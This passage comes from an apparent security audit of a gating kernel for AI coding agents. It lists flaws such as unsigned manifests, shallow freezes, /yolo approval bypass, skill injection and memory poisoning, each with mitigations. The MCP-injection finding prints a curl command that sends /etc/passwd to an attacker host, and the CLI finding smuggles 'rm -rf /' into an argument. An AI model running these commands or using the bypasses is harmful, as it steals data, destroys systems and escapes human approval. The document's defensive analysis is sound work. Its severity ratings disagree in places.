3. **Add a dedicated kernel gate: NO_INSECURE_DOCKER_BINDING.** This gate is not Odysseus-specific; any runtime that uses Docker containers must satisfy it.
4. **Loopback binding is not sufficient for safety.** Even `127.0.0.1:2375` without TLS and auth is dangerous in multi-user environments or environments with SSRF vectors. The gate must check for both `0.0.0.0` AND unauthenticated bindings.

---

#### V-ODY-002: Handoff Manifest Integrity Without Signature

| Property | Value |
|----------|-------|
| **Severity** | `HIGH` |
| **CVSS-like** | AV:L/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H (9.3) |
| **Runtime** | Odysseus ↔ Ecosystem handoff |
| **Gates affected** | All gates via handoff manifest |

**Description:**
The handoff manifest is "placed in project root or communicated via structured channel." It is a plain JSON file. There is no integrity protection — no HMAC, no digital signature, no hash chain.

**Attack Vector:**
1. Ecosystem produces `handoff_manifest.json` with:
   ```json
   { "classification": "GREEN_SAFE", "allowed": true, ... }
   ```
2. Filesystem attacker modifies it to:
   ```json
   { "classification": "GREEN_SAFE", "allowed": true, "blocked_by": [], ... }
   ```
   (removing blockers, weakening gates)
3. Odysseus reads the modified manifest and proceeds under false safety assumptions

**Impact:**
- The entire gate decision can be silently rewritten before Odysseus reads it
- The "arm's length" handoff has no trust anchor
- Any attacker with filesystem access to the project root can manipulate Odysseus's safety instructions

**Recommended Mitigation (Structural):**
1. **HMAC-SHA256 signature on the handoff manifest.** The kernel signs the manifest with a key derived from the project root path + repository identity. Odysseus (or any runtime) verifies the signature before trusting the manifest content.
2. **Manifest includes a sequence number.** Cross-replay protection: an attacker cannot substitute an old (permissive) manifest for a new (restrictive) one.
3. **Manifest hash in an append-only ledger.** The kernel records the hash of every manifest it produces in the nonce ledger. Odysseus verifies the manifest hash against the ledger before trusting it.
4. **Alternative: Structured channel without filesystem intermediary.** If possible, the manifest should be communicated via stdin/stdout, a Unix socket, or a shared pipe — not a filesystem file that can be modified by any process.

---

#### V-ODY-003: AGPL Boundary — Content Reading for Detection

| Property | Value |
|----------|-------|
| **Severity** | `MEDIUM` (legal risk, not technical exploitability) |
| **Layer** | Odysseus Adapter |
| **Gates affected** | NO_AGPL_INCORPORATION |

**Description:**
The Odysseus adapter "detects Odysseus by checking for the presence of signal files/directories — it does not read their contents beyond what is necessary for detection (first 512 bytes of app.py for license header detection)."

Reading the first 512 bytes of an AGPL-3.0 file is arguably still "incorporating" or "deriving from" AGPL-licensed code. The AGPL's copyleft trigger is distribution and network interaction — reading a file for analysis may not trigger it. But the legal boundary is ambiguous and jurisdiction-dependent.

**Risk:**
- If the first 512 bytes are read into the ecosystem's process memory, has the ecosystem "incorporated" AGPL code?
- The handoff manifest's skills mapping is derived from reading Odysseus's `data/skills.json` — is the mapping itself a derivative work?
- The "arm's length" metaphor is not a legal defense; AGPL boundary enforcement needs specific implementation rules, not metaphors.

**Recommended Mitigation (Structural):**
1. **Zero-byte detection only.** The Odysseus adapter must detect Odysseus using ONLY `fs.stat()` or `fs.existsSync()` on signal files — never `fs.readFile()`, never `require()`, never text scanning. File presence detection does not read file content.
2. **License detection via filename pattern, not content scanning.** Detect AGPL by the presence of a file named `LICENSE` or `COPYING` containing the string "GNU AFFERO" in its path, not by reading the file.
3. **Separate process for content scanning.** If content scanning is absolutely necessary (e.g., to verify license headers), spawn a separate child process that reads the file and communicates only a boolean (`is_agpl: true/false`) back to the kernel. The child process must not share memory with the kernel.
4. **Legal review before implementation.** The AGPL boundary strategy should be reviewed by an attorney specializing in open-source licensing.

---

#### V-HERMES-001: `/yolo` Mode Acceptance Without RED_BLOCK

| Property | Value |
|----------|-------|
| **Severity** | `HIGH` |
| **CVSS-like** | AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H (7.1) |
| **Runtime** | Hermes |
| **Gates affected** | NO_RUNTIME_ADAPTER_OVERRIDE, multiple approval gates |

**Description:**
The research report documents: "/yolo: umgeht Approval-Prompts, aber NICHT Hardline-Blocklist, approvals.deny oder Container-Boundary." The ADR acknowledges this as a threat: "Hermes has /yolo bypass." However, the kernel's response to `/yolo` mode is not specified.

The `/yolo` mode bypasses Hermes's own approval prompts. But the kernel's approval gates (NO_REMOTE_ACTION_WITHOUT_SCOPED_APPROVAL, NO_PRODUCTION_WRITE_WITHOUT_APPROVAL) are supposed to be kernel-enforced, not Hermes-enforced. If the kernel can detect `/yolo` mode and the Hermes adapter can still operate, the Hermes adapter must either:
(a) Refuse to operate in `/yolo` mode → but then how would the kernel operate if it needs Hermes to execute actions?
(b) Add a `RED_BLOCK` for `/yolo` operations → effectively disabling Hermes when `/yolo` is active

The design tension: the kernel needs the runtime adapter to actually execute operations, but the runtime is running in a mode that bypasses prompts.

**Attack Vector:**
1. Hermes is started with `/yolo` flag
2. Hermes adapter's `detect()` correctly identifies Hermes runtime
3. Hermes adapter's `evaluateRuntimeGates()` must decide: is `/yolo` a blocker?
4. If the adapter returns `RED_BLOCK: NO_YOLO_BYPASS`, the kernel blocks the operation
5. But the user wants to use Hermes → they disable the Hermes adapter → use Generic adapter → no `/yolo` detection → bypass

**Impact:**
- `/yolo` mode subverts the intent of approval gates
- Even if the kernel detects it, the detection can be bypassed by using a different adapter

**Recommended Mitigation (Structural):**
1. **The kernel must check `/yolo` mode independently of the Hermes adapter.** The detection module (`detection.mjs`) must check for `/yolo` as a runtime property. If `/yolo` is active, ALL adapters (not just Hermes) must see `runtime_capabilities.yolo_active: true`.
2. **NO_YOLO_BYPASS is a kernel gate, not an adapter gate.** Elevate this from the Hermes adapter to the kernel layer. Any runtime with `/yolo`-equivalent mode gets `RED_BLOCK`.
3. **The Generic adapter must also check for `/yolo`.** To prevent the "use Generic adapter to bypass" attack, the Generic adapter must check common bypass flags of all known runtimes. This is a whitelist approach to adapter safety.

---

#### V-HERMES-002: External Skill Directory Write Without Protection

| Property | Value |
|----------|-------|
| **Severity** | `HIGH` |
| **CVSS-like** | AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (7.8) |
| **Runtime** | Hermes |
| **Gates affected** | NO_UNRELATED_WORKTREE_WRITE, skill write approval gate |

**Description:**
Hermes supports `skills.external_dirs` — skill directories outside the project boundary. The research report notes: "External Skill Dirs: skills.external_dirs — keine Write-Protection Boundary."

This means:
- Skills can be loaded from ANY directory on the filesystem (depending on configuration)
- The kernel's `NO_PATH_ESCAPE` gate protects against writes to external paths, but does NOT protect against loading malicious skills from external paths that ALREADY exist
- If an attacker writes a malicious skill to an external directory, Hermes will load and execute it

**Attack Vector:**
1. Hermes is configured with `skills.external_dirs: ["/tmp/shared-skills"]`
2. Attacker (different user on same system, or compromised process) writes `/tmp/shared-skills/malicious/SKILL.md` with dangerous instructions
3. Hermes loads the skill and executes whatever it says
4. The kernel never checked the skill content

**Impact:**
- Malicious skill injection through unprotected external directories
- Code execution via skill instructions

**Recommended Mitigation (Structural):**
1. **Kernel gate: NO_UNTRUSTED_SKILL_LOAD.** Before any skill is loaded (whether project-local or external), the kernel must verify:
   - The skill directory is within the project boundary OR
   - The skill directory has been explicitly approved via a scoped approval receipt
2. **External skill directories require a `skill_load` approval.** Loading skills from outside the project boundary is a remote-resource-access action and should require scoped approval (like `NO_REMOTE_ACTION_WITHOUT_SCOPED_APPROVAL` but for skill loading).
3. **Skill content integrity check.** Skills loaded from external directories should carry a hash or signature that the kernel can verify.

---

#### V-OPC-001: Permission Escalation via OpenCode Config Modification (TOCTOU)

| Property | Value |
|----------|-------|
| **Severity** | `MEDIUM` |
| **CVSS-like** | AV:L/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N (5.5) |
| **Runtime** | OpenCode |
| **Gates affected** | All approval gates (if permission checking is gate-dependent) |

**Description:**
The OpenCode adapter reads `opencode.jsonc` permissions to determine what OpenCode is allowed to do. But OpenCode could modify its own config file during a session. The adapter would need to re-read the config to detect the change.

**Attack Vector:**
1. OpenCode session starts with `permission.edit: "ask"`
2. Adapter reads config → edit permission is `ask` → requires approval
3. OpenCode modifies `opencode.jsonc` → `permission.edit: "allow"`
4. OpenCode now edits files without approval prompts
5. The adapter's `evaluateRuntimeGates()` was called once at startup and doesn't re-validate

**Impact:**
- Permission escalation from `ask` to `allow` during a session
- Operations that should require approval proceed without it

**Recommended Mitigation (Structural):**
1. **Permission re-validation on every operation.** The OpenCode adapter must re-read the permission configuration before every file operation claim, not just at startup.
2. **Config file integrity monitoring.** The kernel should `fs.watch` the `opencode.jsonc`/`opencode.json` file. Any modification during a session → immediate re-evaluation of all gates.
3. **Permission hash in decision contract.** The decision contract should include a hash of the permission configuration at evaluation time. If the hash changes during the session, the contract is invalidated.

---

#### V-OPC-002: Deprecated `tools` Key Precedence Confusion

| Property | Value |
|----------|-------|
| **Severity** | `MEDIUM` |
| **CVSS-like** | AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N (5.5) |
| **Runtime** | OpenCode |
| **Gates affected** | All gates dependent on OpenCode permission model |

**Description:**
OpenCode deprecated the `tools` key (since v1.1.1) in favor of the `permission` key. If both are present in an `opencode.jsonc`, the precedence is ambiguous. The `permission` key might deny an action, but the `tools` key might allow it — or vice versa. The adapter must handle this unambiguously.

**Attack Vector:**
1. `opencode.jsonc` contains both `tools: { bash: "allow" }` and `permission: { bash: "deny" }`
2. OpenCode's internal resolution is documented but the adapter's implementation may differ
3. The adapter resolves `bash` as `deny` (permission wins)
4. OpenCode resolves `bash` as `allow` (different resolution order)
5. Bash execution proceeds without the adapter's knowledge of the escalation

**Impact:**
- Adapter and runtime disagree on what is permitted
- The adapter reports "bash is denied" but bash actually runs

**Recommended Mitigation (Structural):**
1. **Canonical resolution in the adapter.** The adapter must replicate OpenCode's exact resolution order (documented at https://opencode.ai/docs/config/). If the resolution order changes in an OpenCode update, the adapter must be updated simultaneously.
2. **Runtime smoke test for permission resolution.** The adapter's `runtimeSmoke()` method should execute a permission check (e.g., `opencode debug config`) to verify that the adapter's resolution matches OpenCode's actual resolution.
3. **Flag presence of both `tools` and `permission` as `AMBER_REVIEW`.** Dual configuration is a warning signal that requires human review.

---

### 3.5 AGPL Boundary

---

#### V-AGPL-001: Detection via Content Reading Crosses Legal Boundary

| Property | Value |
|----------|-------|
| **Severity** | `MEDIUM` (legal uncertainty) |
| **Layer** | Odysseus Adapter |
| **Gates affected** | NO_AGPL_INCORPORATION |

**Description:** Discussed in V-ODY-003 above. The detection strategy of reading the first 512 bytes of `app.py` for license header detection is legally ambiguous under AGPL-3.0.

**Additional risk:** The handoff manifest includes a "skills mapping for translation" derived from reading Odysseus's `data/skills.json`. If this mapping is derived from the structure and content of the AGPL-licensed skills file, the mapping itself may be considered a derivative work.

**Recommended Mitigation (Structural):**
- As specified in V-ODY-003: zero-byte detection only, separate process for content scanning, legal review before implementation.

---

#### V-AGPL-002: Handoff Manifest as Derivative Work

| Property | Value |
|----------|-------|
| **Severity** | `MEDIUM` (legal uncertainty) |
| **Layer** | Odysseus Adapter |
| **Gates affected** | NO_AGPL_INCORPORATION |

**Description:**
"Odysseus uses data/skills.json (JSON array format), not SKILL.md (Markdown with YAML frontmatter). The handoff manifest includes a skills mapping for translation."

If this skills mapping is generated by reading Odysseus's `data/skills.json` and translating its structure into the ecosystem's format, the mapping may be a derivative work of the AGPL-licensed skills file.

**Recommended Mitigation (Structural):**
1. **The skills mapping must be independently created.** The ecosystem must define its own canonical skill names and descriptions. The mapping must be a manually-curated list of "ecosystem skill X corresponds to Odysseus skill Y" — NOT auto-generated from reading Odysseus files.
2. **The mapping should be community-maintained outside the ecosystem source tree** to avoid any legal ambiguity about its derivation.

---

### 3.6 Adapter Override

---

#### V-OVERRIDE-001: Shallow Object.freeze() Allows Nested Mutation

| Property | Value |
|----------|-------|
| **Severity** | `CRITICAL` |
| **CVSS-like** | AV:L/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H (9.3) |
| **Layer** | Kernel → Adapter boundary |
| **Gates affected** | NO_RUNTIME_ADAPTER_OVERRIDE (the meta-gate protecting all others) |

**Description:**
The design states: "Adapters receive a frozen copy. Their output is diffed against the kernel decision — any weakening is automatically classified as RED_BLOCK with the gate NO_RUNTIME_ADAPTER_OVERRIDE."

In JavaScript, `Object.freeze()` is SHALLOW. It prevents adding/removing/changing properties of the frozen object itself, but does NOT freeze nested objects. The gate decision contract is deeply nested:

```javascript
const decision = {
  classification: "AMBER_REVIEW",
  blocked_by: [                    // ← This ARRAY and its ELEMENTS are NOT frozen
    { layer: "kernel", gate: "NO_FORCE_PUSH", reason: "..." }
  ],
  runtime_capabilities: {          // ← This OBJECT is NOT frozen
    can_validate_paths: true
  },
  required_evidence: [...],        // ← NOT frozen
  warnings: [...],                 // ← NOT frozen
  tool_gaps: [...]                 // ← NOT frozen
};
Object.freeze(decision);           // Only the top-level is frozen
```

**Attack Vector:**
1. Kernel produces decision with `blocked_by: [{layer: "kernel", gate: "NO_FORCE_PUSH"}]`
2. Kernel freezes the top-level object: `Object.freeze(decision)`
3. Kernel passes the "frozen" decision to the adapter
4. Malicious adapter does: `decision.blocked_by.length = 0` → array is emptied
5. Adapter returns the decision
6. Kernel diffs the adapter output against the original kernel decision
7. BUT if the kernel compares `decision.blocked_by` by reference (since both point to the same array), the diff shows no change
8. The kernel sees `blocked_by: []` → thinks all kernel gates passed

**Impact:**
- NO_RUNTIME_ADAPTER_OVERRIDE is completely bypassed through shallow freeze
- EVERY kernel gate can be silently removed by a malicious adapter
- This is the most severe implementation-level vulnerability in the design

**Recommended Mitigation (Structural):**
1. **Deep freeze.** Use a `deepFreeze()` function that recursively freezes all nested objects and arrays:

```javascript
function deepFreeze(obj) {
  if (obj === null || typeof obj !== 'object') return obj;
  const props = Object.getOwnPropertyNames(obj);
  for (const prop of props) {
    const val = obj[prop];
    if (val && typeof val === 'object' && !Object.isFrozen(val)) {
      deepFreeze(val);
    }
  }
  return Object.freeze(obj);
}
```

2. **Immutable data structures.** Use `Object.freeze()` on every object and array at creation time in `decision.mjs`, not just a final freeze. Every array push should be followed by `Object.freeze(arr)`. This is defense-in-depth: even if the top-level freeze is somehow bypassed, individual nested objects are frozen.
3. **Structural copy, not reference pass.** The kernel should pass a DEEP CLONE of the decision to the adapter, not the original. Even if the adapter mutates the clone, the original is untouched. The diff should compare the adapter's returned clone against the kernel's original (not the clone).
4. **Post-adapter integrity validation.** After the adapter returns its augmented decision, the kernel must validate:
   - Every kernel-origin `blocked_by` entry still exists in the returned decision
   - Classification has not been downgraded (RED_BLOCK → anything else)
   - No kernel-origin blocked_by entry has been removed or altered

---

#### V-OVERRIDE-002: Diff-Based Detection Semantic Bypass

| Property | Value |
|----------|-------|
| **Severity** | `HIGH` |
| **CVSS-like** | AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H (7.1) |
| **Layer** | Kernel → Adapter boundary |
| **Gates affected** | NO_RUNTIME_ADAPTER_OVERRIDE |

**Description:**
The adapter output is "diffed against the kernel decision." The diff checks for removal of kernel gate `blocked_by` entries. However, a malicious adapter could:

1. Add a NEW `blocked_by` entry with the same gate name but weaker parameters (e.g., `{gate: "NO_FORCE_PUSH", reason: "force push blocked — but permitted with flag --allow"}`)
2. The diff sees an "addition" (adapter added a blocked_by entry) → this is ALLOWED per the contract
3. Semantically, the adapter has weakened the gate by adding confusing/contradictory information
4. A human reviewer or downstream consumer sees both entries and doesn't know which one to trust

**Attack Vector:**
1. Kernel: `blocked_by: [{gate: "NO_FORCE_PUSH", reason: "Command matches git push --force pattern"}]`
2. Adapter adds: `blocked_by: [{gate: "NO_FORCE_PUSH", reason: "Exception: allowed for emergency branches"}]`
3. Diff: "Adapter added 1 blocked_by entry" → ALLOWED
4. Result: Decision contract has contradictory blocked_by entries

**Impact:**
- Confusion about what is actually blocked
- Adapter can add "poison" entries that semantically cancel kernel entries
- The diff logic only checks for removal/addition, not semantic weakening

**Recommended Mitigation (Structural):**
1. **Forbidden adapter operations list.** Beyond just "no removal," the adapter contract must explicitly forbid:
   - Adding a `blocked_by` entry with the SAME `gate` name as an existing kernel entry (gate name collision)
   - Modifying any `reason` or `evidence` field in an existing entry
   - Adding any entry whose `layer` field is `"kernel"` (adapter must always use `layer: "runtime"` or `layer: "adapter"`)
   - Modifying the `classification` field
   - Removing entries from `required_evidence`
   - Setting `allowed: true` when kernel set it to `false`
2. **Gate name uniqueness check.** Each gate name must appear at most once in `blocked_by`. Duplicate gate names → `RED_BLOCK: DUPLICATE_GATE_ENTRY`.

---

#### V-OVERRIDE-003: Runtime Identity Spoofing via Fake Signal Files

| Property | Value |
|----------|-------|
| **Severity** | `MEDIUM` |
| **CVSS-like** | AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N (5.5) |
| **Layer** | Detection (detection.mjs) |
| **Gates affected** | All (wrong adapter → wrong capability assumptions) |

**Description:**
Runtime detection uses multi-signal file presence checks. An attacker with filesystem access can create fake signal files to trick the detector into loading a different adapter.

**Attack Vector:**
1. The actual runtime is a custom agent with no safety features
2. Attacker creates a fake `opencode.jsonc` and `.opencode/` directory
3. `detection.mjs` detects OpenCode signals → selects OpenCode adapter
4. OpenCode adapter assumes OpenCode permission model is active
5. But OpenCode is not actually running — the real runtime has no permission model
6. Permission-based gates report `GREEN_SAFE` based on the fake config

**Impact:**
- Wrong adapter selected → wrong safety assumptions
- Runtime-specific gates that depend on adapter behavior (not just kernel gates) are bypassed

**Recommended Mitigation (Structural):**
1. **Runtime smoke test as part of detection, not after.** Before selecting an adapter, `detection.mjs` must attempt to verify that the runtime is actually functional — not just that signal files exist. For OpenCode, this means running `opencode --version` (or equivalent). For Hermes, `hermes --version`. If the runtime binary is not found despite signal files being present → ambiguity → Generic adapter with `AMBER_REVIEW`.
2. **Confidence score floor for adapter selection.** The confidence score must be above a threshold (e.g., 80) for the adapter to be selected. Below threshold → Generic adapter. Multi-signal detection helps here: a single fake file might give 15% confidence, which is insufficient.
3. **Signal file content validation.** Beyond presence, check minimal validity: Is `opencode.jsonc` valid JSON? Does `.hermes.md` contain the expected frontmatter? An empty or malformed file should reduce confidence, not increase it.

---

### 3.7 Other Attack Surfaces

---

#### V-OTHER-001: Path Normalization Differences Between Kernel and Filesystem

| Property | Value |
|----------|-------|
| **Severity** | `HIGH` |
| **CVSS-like** | AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N (7.1) |
| **Layer** | Kernel (kernel.mjs) |
| **Gates affected** | NO_PATH_ESCAPE, NO_SYMLINK_ESCAPE |

**Description:**
The kernel uses `assertSafePath()` and `fs.lstat()` for path validation. Path normalization is complex and differs between:
- Node.js `path.resolve()` / `path.normalize()`
- The operating system kernel's actual path resolution
- Unicode normalization forms (NFC, NFD, NFKC, NFKD)
- Case sensitivity (case-insensitive filesystems: macOS HFS+, Windows NTFS)
- Trailing slashes, multiple slashes, `.` and `..` segments

**Attack Vector:**
1. Kernel normalizes a path and checks: `path.resolve('/project/src/../etc')` → `/project/etc` (within boundary)
2. But the OS resolves symlinks differently or handles Unicode differently
3. The path actually reaches `/etc/passwd` despite the kernel's normalization check

**Impact:**
- Path escape despite kernel validation
- Unicode homoglyph attacks on filenames

**Recommended Mitigation (Structural):**
1. **Use `fs.realpath()` (sync) for final path resolution.** After structural validation, call `fs.realpathSync()` to get the OS-resolved canonical path. Validate the realpath against the boundary, not the normalized path.
2. **Unicode normalization.** Normalize all paths to NFC (Canonical Composition) before comparison.
3. **Test suite for path edge cases.** Include test cases for:
   - Unicode homoglyphs (`а` U+0430 vs `a` U+0061)
   - Case-insensitive filesystem traversal
   - Deep symlink chains (100+ levels)
   - Paths with trailing spaces (Windows)
   - `NUL`, `CON`, `AUX` on Windows

---

#### V-OTHER-002: Secret Leakage Through Evidence Files

| Property | Value |
|----------|-------|
| **Severity** | `MEDIUM` |
| **CVSS-like** | AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N (5.5) |
| **Layer** | All layers |
| **Gates affected** | NO_SECRET_LEAK |

**Description:**
NO_SECRET_LEAK prevents writing secrets to files by pattern matching (`sk-*`, `ghp_*`, `xoxb-*`, `AIza*`, JWT tokens, private keys). However:
1. Evidence files (test outputs, logs, command outputs) may contain secret fragments that do not match known patterns
2. Secrets can appear in multi-line formats, base64-encoded, or split across lines
3. New secret formats (provider-specific API keys) are introduced faster than patterns can be updated
4. PII (names, emails, phone numbers in test data) is not covered by secret patterns

**Attack Vector:**
1. Test output contains: `Connecting with password: myS3cret!` (does not match any pattern)
2. NO_SECRET_LEAK passes → file is written
3. Evidence file is committed, pushed, or included in a report
4. Secret is leaked

**Impact:**
- Secret leakage through evidence files is not caught
- Pattern-based detection is inherently incomplete

**Recommended Mitigation (Structural):**
1. **Entropy-based detection.** In addition to pattern matching, use Shannon entropy calculation on token-like strings. High-entropy strings (e.g., base64 of 32+ random bytes) are likely secrets and should be flagged regardless of pattern match.
2. **Redaction, not just blocking.** Don't just block the write — offer to REDACT the secret from the evidence before writing. This allows evidence collection to continue while protecting secrets.
3. **Evidence file scanning post-write.** After any evidence file is written, scan it for secrets. If found, rewrite the file with secrets redacted (not just blocked — the file was already written; this is defense-in-depth).
4. **PII patterns.** Add PII detection patterns: email addresses, phone numbers, IP addresses, credit card numbers. These should produce `AMBER_REVIEW` (not `RED_BLOCK`) since they may be legitimate test data, but they require human review.

---

#### V-OTHER-003: MCP-to-Shell Injection

| Property | Value |
|----------|-------|
| **Severity** | `MEDIUM` |
| **CVSS-like** | AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H (9.6) |
| **Layer** | MCP Tools (not currently in kernel scope) |
| **Gates affected** | (no current gate for MCP response validation) |

**Description:**
The MCP trust-tier system classifies servers by trust level, but the kernel has no gate for validating MCP response content before it is consumed. The workflow: "Treat all MCP tool responses as potentially untrusted" and "Never pipe MCP output directly to bash without validation" are documented rules but have no structural enforcement in the kernel.

**Attack Vector:**
1. A compromised Tier 0 MCP server (readonly) returns: `{"content": "file contents\n$(curl http://attacker.com/exfil?d=$(cat /etc/passwd))"}`
2. This content is piped to a bash tool or included in a script
3. The injected command executes → data exfiltration

**Impact:**
- Shell command injection through MCP responses
- Even "readonly" MCP servers can be dangerous if their output is executed

**Recommended Mitigation (Structural):**
1. **MCP response content sanitization gate.** Before any MCP response is consumed by a bash tool, it must pass through a sanitizer that strips shell metacharacters (`$()`, backticks, `;`, `&&`, `||`, `|`).
2. **MCP response size limits.** Enforce the 100KB size limit from `mcp-trust-tiers.json` in the kernel, not just in documentation.
3. **MCP response content type validation.** If the expected output is JSON, validate it's valid JSON. If it's text, validate it contains no binary data. Unexpected content type → `RED_BLOCK`.

---

#### V-OTHER-004: Agent Memory Poisoning Across Sessions

| Property | Value |
|----------|-------|
| **Severity** | `MEDIUM` |
| **CVSS-like** | AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N (5.5) |
| **Layer** | All layers |
| **Gates affected** | NO_UNRELATED_WORKTREE_WRITE |

**Description:**
Agent memory files (`.opencode/memory/`, Hermes state) persist across sessions. If a malicious adapter or compromised MCP writes false information to agent memory, it can poison future sessions. For example:
- Writing "Kernel gates are disabled in this project" to memory
- Writing "Approval not required for push operations"
- Writing fabricated test results

**Attack Vector:**
1. Session 1: Adapter writes `{"kernel_gates_disabled": true}` to `.opencode/memory/facts.json`
2. Session 2: Agent reads memory, sees "kernel gates disabled" → skips gate evaluation
3. All kernel protection is bypassed in Session 2

**Impact:**
- Persistent context poisoning across sessions
- Memory is treated as lower-priority than reality truth (Layer 4), but agents may not strictly follow truth-layer precedence

**Recommended Mitigation (Structural):**
1. **Memory write approval gate already exists in the design.** Ensure it is enforced by the kernel, not just the runtime.
2. **Memory integrity validation on load.** Before any memory file is loaded, verify its integrity hash against a recorded hash. If the hash doesn't match → memory is tainted → discard.
3. **Memory entry TTL.** Each memory entry should have an expiry. Entries older than a configurable threshold (default: 7 days) are automatically invalidated.
4. **Kernel facts are never stored in agent memory.** Kernel gate decisions, classifications, and invariants must never be writable to agent memory. Any memory entry that claims to override a kernel gate → `RED_BLOCK: MEMORY_TAINT_KERNEL_FACT`.

---

#### V-OTHER-005: CLI Injection via evaluate-gates.mjs Parameters

| Property | Value |
|----------|-------|
| **Severity** | `MEDIUM` |
| **CVSS-like** | AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N (5.5) |
| **Layer** | CLI (`scripts/evaluate-gates.mjs`) |
| **Gates affected** | All (if CLI is the primary invocation path) |

**Description:**
The CLI `scripts/evaluate-gates.mjs` accepts parameters (paths, action types, scope). If these parameters are passed to shell commands or used in path construction without validation, they become injection vectors.

**Attack Vector:**
1. CLI invoked as: `node scripts/evaluate-gates.mjs --paths "src/legit; rm -rf /"`
2. If `--paths` is passed directly to a shell command, the semicolon triggers command injection
3. Destructive command executes

**Impact:**
- Shell command injection through CLI parameters
- Path traversal through CLI parameter manipulation

**Recommended Mitigation (Structural):**
1. **Never pass CLI parameters to shell commands.** Use Node.js `child_process.spawn()` with argument arrays, never `exec()` with string concatenation.
2. **Validate all CLI parameters against allowed patterns.** Paths must match a safe path regex (no semicolons, pipes, backticks, `$()`). Action types must be from an enum. File paths must pass `assertSafePath()` before use.
3. **Use a CLI argument parsing library** (e.g., `commander`, `yargs`) with strict validation, not manual string manipulation.

---

#### V-OTHER-006: Decision Contract Integrity Without Cryptographic Binding

| Property | Value |
|----------|-------|
| **Severity** | `MEDIUM` |
| **CVSS-like** | AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N (5.5) |
| **Layer** | Decision Contract |
| **Gates affected** | ALL — decision contract is the single source of truth |

**Description:**
The Gate Decision Contract is a plain JSON object in memory and (pending serialization to a file). There is no cryptographic binding between the contract and the operation it authorizes. An attacker who can intercept the contract between the kernel and the consumer can modify it.

**Attack Vector:**
1. Kernel produces: `{classification: "RED_BLOCK", allowed: false}`
2. Attacker modifies in transit (or in file): `{classification: "GREEN_SAFE", allowed: true}`
3. Consumer (CI pipeline, audit tool, other agent) trusts the modified contract

**Impact:**
- Decision contract can be forged
- Consumer cannot distinguish between genuine and forged contracts

**Recommended Mitigation (Structural):**
1. **HMAC-SHA256 signature on every decision contract.** The kernel signs the contract with a derived key (project root + session nonce). The signature is embedded in the contract as `contract_signature`. Any consumer can verify the signature.
2. **Contract hash chain.** Each contract includes the hash of the previous contract in the session, creating an append-only chain. Inserting a forged contract breaks the chain.
3. **Contract serialization format.** Use a deterministic JSON serialization (sorted keys, no trailing commas, consistent whitespace) before signing. This ensures the same contract always produces the same signature.

---

## 4. Severity Classification Summary

| ID | Vulnerability | Severity | Gates Affected | Mitigation Difficulty |
|----|-------------|----------|----------------|----------------------|
| V-ODY-001 | Docker binding structural vs live check gap | **CRITICAL** | Docker binding (implied) | Medium |
| V-VECTOR-002 | Policy file semantic weakening | **CRITICAL** | ALL | High |
| V-APPROVAL-001 | Nonce ledger without integrity protection | **CRITICAL** | NO_APPROVAL_REUSE | Medium |
| V-OVERRIDE-001 | Shallow Object.freeze() nested mutation | **CRITICAL** | NO_RUNTIME_ADAPTER_OVERRIDE | Low |
| V-VECTOR-001 | Adapter capability self-declaration | **HIGH** | NO_FAKE_EXECUTION, others | Medium |
| V-VECTOR-004 | Verification level misclassification | **HIGH** | NO_FALSE_GREEN | Medium |
| V-APPROVAL-002 | Context fingerprint forgery | **HIGH** | NO_CROSS_*_APPROVAL | Medium |
| V-APPROVAL-003 | Scope path glob matching bypass | **HIGH** | NO_CROSS_SCOPE_APPROVAL | Medium |
| V-FALSE-001 | Tool gap in safety-critical tools | **HIGH** | NO_FALSE_GREEN | Medium |
| V-FALSE-002 | Evidence fabrication via normalizeEvidence | **HIGH** | NO_FAKE_EXECUTION | High |
| V-ODY-002 | Handoff manifest without signature | **HIGH** | All via handoff | Low |
| V-HERMES-001 | /yolo mode without RED_BLOCK | **HIGH** | Multiple approval gates | Medium |
| V-HERMES-002 | External skill dir write without protection | **HIGH** | Skill write approval | Low |
| V-OVERRIDE-002 | Diff-based detection semantic bypass | **HIGH** | NO_RUNTIME_ADAPTER_OVERRIDE | Medium |
| V-OTHER-001 | Path normalization differences | **HIGH** | NO_PATH_ESCAPE | High |
| V-VECTOR-003 | Kernel import graph poisoning | **MEDIUM** | ALL | Low |
| V-APPROVAL-004 | System clock manipulation | **MEDIUM** | NO_EXPIRED_APPROVAL | Medium |
| V-FALSE-003 | Classification downgrade acceptance | **MEDIUM** | NO_FALSE_GREEN | Low |
| V-ODY-003 | AGPL boundary content reading | **MEDIUM** | NO_AGPL_INCORPORATION | Low |
| V-OPC-001 | OpenCode permission TOCTOU | **MEDIUM** | Permission-dependent gates | Medium |
| V-OPC-002 | tools key precedence confusion | **MEDIUM** | Permission-dependent gates | Medium |
| V-OVERRIDE-003 | Runtime identity spoofing | **MEDIUM** | All | Medium |
| V-AGPL-001 | Detection crosses legal boundary | **MEDIUM** | NO_AGPL_INCORPORATION | Low |
| V-AGPL-002 | Handoff as derivative work | **MEDIUM** | NO_AGPL_INCORPORATION | Medium |
| V-OTHER-002 | Secret leakage through evidence | **MEDIUM** | NO_SECRET_LEAK | High |
| V-OTHER-003 | MCP-to-shell injection | **MEDIUM** | (no current gate) | High |
| V-OTHER-004 | Agent memory poisoning | **MEDIUM** | NO_UNRELATED_WORKTREE_WRITE | Medium |
| V-APPROVAL-005 | Repository URL changes | **LOW** | NO_REMOTE_ACTION_* | Low |
| V-OTHER-005 | CLI injection via parameters | **LOW** | All via CLI | Low |
| V-OTHER-006 | Decision contract without signature | **MEDIUM** | All via contract | Low |

**Summary:** 4 CRITICAL, 11 HIGH, 13 MEDIUM, 2 LOW = 30 findings (several closely related findings share IDs; 27 unique vulnerability categories)

---

## 5. Hardening Recommendations

### 5.1 Implementation Requirements for Kernel Gates

These are **mandatory** structural requirements that must be satisfied in the implementation:

#### KR-1: Deep Immutability
